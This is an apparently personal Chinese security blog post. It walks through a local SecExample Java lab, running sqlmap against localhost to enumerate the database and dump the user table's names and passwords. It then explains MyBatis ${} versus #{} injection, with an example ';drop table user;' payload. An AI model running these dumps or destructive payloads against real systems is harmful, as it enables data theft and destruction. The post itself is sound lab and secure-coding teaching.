@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>secExample java靶场sql注入实验 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">secExample java靶场sql注入实验</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 30, 2022&nbsp;&nbsp;16:00:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="1-安装与启动"><a href="#1-安装与启动" class="headerlink" title="1.安装与启动"></a>1.安装与启动</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/14892442.html">https://www.cnblogs.com/suyu7/p/14892442.html</a></p>
+<p>使用Java开发的漏洞靶场 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载包</span></span><br><span class="line">git clone https://github.com/tangxiaofeng7/SecExample.git </span><br><span class="line">cd SecExample </span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment">#docker启动</span></span><br><span class="line">docker run -d -p <span class="number">80</span>:<span class="number">80</span> docker/getting-started</span><br><span class="line"><span class="comment">#docker容器启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment">#docker容器停止</span></span><br><span class="line">docker-compose down</span><br><span class="line">访问</span><br><span class="line">http://localhost:<span class="number">9091</span>/sql </span><br></pre></td></tr></table></figure>
+
+<p>我的是因为8080端口被占用修改了docker-compose.yml的端口号</p>
+<p>ports:</p>
+<p>​      - “9091:8080”</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648627125615-863845e8-52ad-472e-9dd5-58880ad6a4aa.png" alt="img"></p>
+<h2 id="2-使用sqlmap进行测试"><a href="#2-使用sqlmap进行测试" class="headerlink" title="2.使用sqlmap进行测试"></a>2.使用sqlmap进行测试</h2><p>当前数据库</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost:9091/sql">http://localhost:9091/sql</a> –forms –current-db</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648524826190-9450c369-eff9-44fc-a9a2-d31e30ff3b01.png" alt="img"></p>
+<p>查找表名</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost:9091/sql">http://localhost:9091/sql</a>  –forms -D mybatis –tables</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648525078790-d22dd72a-97e9-4b71-a8d6-38fc4871c9c1.png" alt="img"></p>
+<p>爆列名</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost:9091/sql">http://localhost:9091/sql</a>  –forms -D mybatis -T user –columns</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648525509933-59e3de3e-5917-4680-8dcd-d0ff053b6e85.png" alt="img"></p>
+<p>爆数据</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost:9091/sql">http://localhost:9091/sql</a>  –forms -D mybatis -T user -C id,name,pwd –dump</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648525865248-4b0871ed-2a47-4227-b440-779bcea0380d.png" alt="img"></p>
+<hr>
+<h2 id="3-报错解决"><a href="#3-报错解决" class="headerlink" title="3.报错解决"></a>3.报错解决</h2><p>Starting mysql-db … error</p>
+<p>ERROR: for mysql-db  Cannot start service mysql: Ports are not available: listen tcp 0.0.0.0:3306: bind: Only one usage of each socket address (protocol&#x2F;network address&#x2F;port) is normally permitted.</p>
+<p>ERROR: for mysql  Cannot start service mysql: Ports are not available: listen tcp 0.0.0.0:3306: bind: Only one usage of each socket address (protocol&#x2F;network address&#x2F;port) is normally permitted.</p>
+<p>ERROR: Encountered errors while bringing up the project.</p>
+<p>原因是docker 启动mysql 容器出错Ports are not available: listen tcp 0.0.0.0:3306</p>
+<p>需要打开服务关闭mysql</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648617777039-e8d780bd-689f-48bb-a6ff-6c8ce160c592.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648617793811-779d7c63-5895-48c2-9b9c-3508bdc4efb6.png" alt="img"></p>
+<hr>
+<h2 id="4-代码分析"><a href="#4-代码分析" class="headerlink" title="4.代码分析"></a>4.代码分析</h2><p>Docker容器和主机如何互相拷贝传输文件</p>
+<p>docker cp :用于容器与主机之间的数据拷贝。</p>
+<p>语法</p>
+<p>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</p>
+<p>docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</p>
+<p>OPTIONS说明：</p>
+<p>-L :保持源目标中的链接</p>
+<p>实例</p>
+<p>将主机.&#x2F;RS-MapReduce目录拷贝到容器30026605dcfe的&#x2F;home&#x2F;cloudera目录下。</p>
+<p>docker cp RS-MapReduce 30026605dcfe:&#x2F;home&#x2F;cloudera</p>
+<p>将容器30026605dcfe的&#x2F;home&#x2F;cloudera&#x2F;RS-MapReduce目录拷贝到主机的&#x2F;tmp目录中。</p>
+<p>docker cp  30026605dcfe:&#x2F;home&#x2F;cloudera&#x2F;RS-MapReduce &#x2F;tmp&#x2F;</p>
+<hr>
+<p>使用下面的命令下载容器内中的jar进行分析</p>
+<p>docker cp 4adba8a2116a:&#x2F;app.jar .&#x2F;test</p>
+<p>然后用jadx打开</p>
+<p> jadx-gui app.jar</p>
+<p>看mapper</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648622649222-3be8d0fd-71ed-42dc-8968-67df68fa1072.png" alt="img"></p>
+<p>查看对应的mapper的配置文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648622695213-a92b77dd-7d0d-47ec-9f6d-b4a62bbd7978.png" alt="img"></p>
+<p><strong>mybatis的sql注入漏洞原理：</strong></p>
+<p>1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。</p>
+<p>如：where username&#x3D;#{username}，如果传入的值是111,那么解析成sql时的值为where username&#x3D;”111”, 如果传入的值是id，则解析成的sql为where username&#x3D;”id”.　</p>
+<p>2、$将传入的数据直接显示生成在sql中。</p>
+<p>如：where username&#x3D;${username}，如果传入的值是111,那么解析成sql时的值为where username&#x3D;111；</p>
+<p>如果传入的值是;drop table user;，则解析成的sql为：select id, username, password, role from user where username&#x3D;;drop table user;</p>
+<p>3、#方式能够很大程度防止sql注入，$方式无法防止Sql注入。</p>
+<p>4、$方式一般用于传入数据库对象，例如传入表名.</p>
+<p>5、一般能用#的就别用$，若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。</p>
+<p>6、在MyBatis中，“${xxx}”这样格式的参数会直接参与SQL编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“${xxx}”这样的参数格式。所以，这样的参数需要我们在代码中手工进行处理来防止注入。</p>
+<p>【结论】在编写MyBatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止SQL注入攻击。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/3455840316.html">http://tea9.xyz/post/3455840316.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/749191339.html">API安全APIKit安装使用</a>
+            
+            
+            <a class="next" rel="next" href="/post/842107191.html">src信息收集</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
